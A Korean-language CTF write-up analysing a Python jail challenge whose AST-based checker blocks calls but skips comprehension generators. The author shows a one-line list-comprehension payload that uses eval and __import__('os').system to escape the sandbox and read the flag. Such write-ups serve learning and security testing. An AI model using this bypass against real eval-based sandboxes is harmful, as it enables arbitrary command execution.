# index

- [analysis](#analysis)

- [exploit](#exploit)

# analysis

으어어어 Python Jail 문제임

주어진 코드는 다음과 같다.

```python
#!/usr/bin/env python
import sys
import ast



blacklist = [ast.Call, ast.Attribute]

def check(node):
    if isinstance(node, list):
        return all([check(n) for n in node])
    else:
        """
	expr = BoolOp(boolop op, expr* values)
	     | BinOp(expr left, operator op, expr right)
	     | UnaryOp(unaryop op, expr operand)
	     | Lambda(arguments args, expr body)
	     | IfExp(expr test, expr body, expr orelse)
	     | Dict(expr* keys, expr* values)
	     | Set(expr* elts)
	     | ListComp(expr elt, comprehension* generators)
	     | SetComp(expr elt, comprehension* generators)
	     | DictComp(expr key, expr value, comprehension* generators)
	     | GeneratorExp(expr elt, comprehension* generators)
	     -- the grammar constrains where yield expressions can occur
	     | Yield(expr? value)
	     -- need sequences for compare to distinguish between
	     -- x < 4 < 3 and (x < 4) < 3
	     | Compare(expr left, cmpop* ops, expr* comparators)
	     | Call(expr func, expr* args, keyword* keywords,
			 expr? starargs, expr? kwargs)
	     | Repr(expr value)
	     | Num(object n) -- a number as a PyObject.
	     | Str(string s) -- need to specify raw, unicode, etc?
	     -- other literals? bools?

	     -- the following expression can appear in assignment context
	     | Attribute(expr value, identifier attr, expr_context ctx)
	     | Subscript(expr value, slice slice, expr_context ctx)
	     | Name(identifier id, expr_context ctx)
	     | List(expr* elts, expr_context ctx) 
	     | Tuple(expr* elts, expr_context ctx)

	      -- col_offset is the byte offset in the utf8 string the parser uses
	      attributes (int lineno, int col_offset)

        """

        attributes = {
            'BoolOp': ['values'],
            'BinOp': ['left', 'right'],
            'UnaryOp': ['operand'],
            'Lambda': ['body'],
            'IfExp': ['test', 'body', 'orelse'],
            'Dict': ['keys', 'values'],
            'Set': ['elts'],
            'ListComp': ['elt'],
            'SetComp': ['elt'],
            'DictComp': ['key', 'value'],
            'GeneratorExp': ['elt'],
            'Yield': ['value'],
            'Compare': ['left', 'comparators'],
            'Call': False, # call is not permitted
            'Repr': ['value'],
            'Num': True,
            'Str': True,
            'Attribute': False, # attribute is also not permitted
            'Subscript': ['value'],
            'Name': True,
            'List': ['elts'],
            'Tuple': ['elts'],
            'Expr': ['value'], # root node 
        }

        for k, v in attributes.items():
            if hasattr(ast, k) and isinstance(node, getattr(ast, k)):
                if isinstance(v, bool):
                    return v
                return all([check(getattr(node, attr)) for attr in v])


if __name__ == '__main__':
    expr = sys.stdin.read()
    body = ast.parse(expr).body
    if check(body):
        sys.stdout.write(repr(eval(expr)))
    else:
        sys.stdout.write("Invalid input")
    sys.stdout.flush()
```

코드의 동작을 간단히 요약해보면 `사용자의 입력 -> check()를 이용한 검사 -> eval()로 수행!` 정도가 될 것 같다. **ast(Abstract Syntax Trees) module**은 트리 구조를 사용할 때 많이 사용한다고 하는데, 해당 모듈의 `parse()`를 사용해서 사용자의 입력을 `attributes` 별로 나타낸 뒤, `check()`를 통해 해당 `attributes`를 확인한다. 

여기서 가장 중요한 `call`을 **False**로 하였기 때문에, 함수를 부르거나하는 동작들을 막아버린다. `all()`의 경우 모든 요소가 `True`여야 `True`를 리턴하므로 **parsing** 시 `call`을 만나버리면 `eval`로 실행할 수 없다.



여기서 좀 시간도 많이 쓰고 거시기했는데, 알고보니 주석처리 된 항목이 실제 **ast**에서 정의된 문법이었다. 정의된 것에 반해, `check()` 에서 사용하는 항목들은 좀 부실한 것들이 존재했는데, 다음과 같다.

```python
'''
    expr = BoolOp(boolop op, expr* values)
	     | BinOp(expr left, operator op, expr right)
	     | UnaryOp(unaryop op, expr operand)
	     | Lambda(arguments args, expr body)
         | ListComp(expr elt, comprehension* generators)
	     | SetComp(expr elt, comprehension* generators)
	     | DictComp(expr key, expr value, comprehension* generators)
	     | GeneratorExp(expr elt, comprehension* generators)
'''
        attributes = {
            'BoolOp': ['values'],
            'BinOp': ['left', 'right'],
            'UnaryOp': ['operand'],
            'Lambda': ['body'],
            'IfExp': ['test', 'body', 'orelse'],
			'ListComp': ['elt'],
            'SetComp': ['elt'],
            'GeneratorExp': ['elt'],
```

내 짧은 견해로는 일단 operation으로 jail 문제에서 많이 사용하는 `__import__('os').system('command')`같은 거를 만들 수 없을 것 같아 제외하였고, **Lambda**와 **comprehension generators**(범위나 조건을 걸때 사용)를 통해 **ListComp, SetComp, DictComp, GeneratorExp** 정도에서 명령을 실행시킬 수 있을 것 같았다. 

**Lambda**로 열심히 삽질한 결과,

> 실패했다....ㅇㅅㅇ??



...그래서 **ListComp**에서 시도한 결과, **comprehension generators**로 사용하는 함수를 `eval(__import__('os').system('command'))`로 사용하니 무사히 우회가 가능햇다



# exploit

```python
[a for a in eval("__import__('os').system('cat flag')")]
```



코드로 짤라고 했는데 도무지 `EOF`를 줄 수 있는 방법을 못 찾겠다.. `ctrl+d` 하면 **src.py**가 아니라 스크립트가 꺼짐 ㄷㄷ;
